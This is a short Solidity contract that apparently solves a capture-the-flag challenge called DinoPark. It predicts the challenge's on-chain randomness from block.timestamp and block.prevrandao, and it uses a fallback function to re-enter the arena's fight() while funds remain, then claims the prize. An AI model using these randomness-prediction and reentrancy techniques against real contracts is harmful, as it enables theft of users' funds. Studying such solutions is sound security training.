// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "forge-std/console.sol";

interface Arena {
    enum FightMode { Normal, Ranked }
    function fight(uint8 guess, FightMode mode) external;
}

interface DinoPark {
    function arena() external returns (address);
    function claimGoldenEgg() external;
    function isSolved() external returns (bool);
}

contract Solve {
    address public dino;
    address public arena;
    uint8 public guess;

    constructor(address _dino, address _arena) {
        dino = _dino;
        arena = _arena;
    }

    function attack() public {
        guess = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 100);

        if (guess < 31)
            revert("Pre-attack condition 01 is not cleared!");
        else
            console.log("Pre-attack condition is cleared!");

        Arena(arena).fight(guess, Arena.FightMode.Normal);

        DinoPark(dino).claimGoldenEgg();
    }

    fallback() external payable {
        if (address(arena).balance >= 0.1 ether) {
            Arena(arena).fight(guess, Arena.FightMode.Normal);
        }
    }
}